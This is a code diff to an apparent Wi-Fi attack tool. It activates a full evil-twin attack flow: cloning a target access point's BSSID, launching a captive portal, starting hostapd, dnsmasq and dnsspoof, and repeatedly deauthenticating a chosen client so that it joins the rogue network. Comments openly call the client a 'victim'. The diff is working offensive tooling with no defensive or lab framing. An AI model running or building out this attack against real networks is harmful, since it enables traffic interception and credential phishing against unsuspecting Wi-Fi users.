@@ -89,16 +89,25 @@ def main():
                 print(f"\nSelected AP: {ap_info['SSID']} ({bssid})")
                 print(f"Selected Client: {client_mac}, Packets: {clients[client_mac]['pkt_count']}, Last Seen: {clients[client_mac]['last_seen']}")
 
-                # Start the attack
+                # 1) Create the fake AP configs & networking
+                print(f"\nCreating Evil AP with BSSID {bssid} on interface {ap_iface}...")
                 attack.create_evil_ap(ap_info, ap_iface)
 
-                # Launch captive portal in background
-                # portal_thread = Thread(target=attack.start_captive_portal, daemon=True)
-                # portal_thread.start()
+                # 2) Launch the captive portal (Apache) in background
+                print("Starting captive portal…")
+                portal_thread = Thread(target=attack.start_captive_portal, daemon=True)
+                portal_thread.start()
 
-                # attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
+                # 3) Bring up hostapd, dnsmasq and dnsspoof
+                # Capture the process handles so you can shut them down cleanly later
+                print("Starting hostapd/dnsmasq/dnsspoof…")
+                procs = attack.start_attack(ap_iface)
 
-                # Stop packet sniffing (we don't need it now)
+                # 4) Deauth the victim until they associate to your Evil AP
+                attack.deauth_victim({'BSSID': bssid}, client_mac, iface
+                )
+
+                # 5) Stop sniffing now that the victim is “in”
                 scan.stop_sniff.set()
                 sniffer.join()
 
@@ -107,6 +116,8 @@ def main():
                     while True:
                         time.sleep(1)
                 except KeyboardInterrupt:
+                    for p in procs.values():
+                        p.terminate()
                     print("Shutting down captive portal.")
                     sys.exit(0)
     except KeyboardInterrupt:
